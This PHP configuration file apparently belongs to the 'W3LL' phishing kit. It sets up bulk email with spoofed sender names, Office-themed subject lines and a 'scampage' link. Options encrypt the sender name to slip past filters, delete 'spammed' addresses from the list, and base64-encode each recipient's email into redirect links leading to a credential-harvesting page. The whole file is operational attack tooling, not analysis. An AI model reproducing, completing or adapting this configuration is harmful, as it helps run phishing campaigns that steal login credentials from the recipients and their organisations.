<?php
/* W3LL Features SETUP */

// PLEASE READ FILE [README.txt] BEFORE USE

include 'token.php';
include 'settings.php';

//Setup
$W3LL_setup = [
"fromname"=> [

// MULTI FROM NAME

"++w3ll_domain++ Team #id:++w3ll_randstring++", //FROMNAME 1

//"++w3ll_domain1++ Team id:#++w3ll_randstring++", //FROMNAME 2


],

"frommail"=> "++w3ll_smtp++",

"subject"=> [

// MULTI SUBJECT

"Office ++w3ll_date++ id:++w3ll_data_sha1++", //SUBJECT 1


],

"mail_list"=> $mail_list,"msgfile"=> $msg_file, "attach" => $attachment,

"scampage"=> $scampage,

"priority"=> 1, // (1= High Priority.  0 = Normal Priority.)

"sleeptime"=> 8, // (Delay Per Email, Default 5)

"ratio" => 1, // (Ratio Email Per Delay, Default 1)

"userremoveline" => 1, // (1= Remove Spammed Email From List.)

"filesend" => 0, // (1= Send Attachment File.)

"redirect" => 2, //( 1 = Use on link [?email=email base64]. 2 = Use on link [#base64]. 3 = Use on link [?email=email]. 4 = Can use all shortlink including google redirect.)

"subject_encrypt" => 0, //(1= Encrypt Email Subject)

"fromname_encrypt" => 1, //(1= Encrypt Email Fromname)

"replacement" => 1, //(1= Use Replacement Function. Ex:++w3ll_short++)

];

/* END */


?>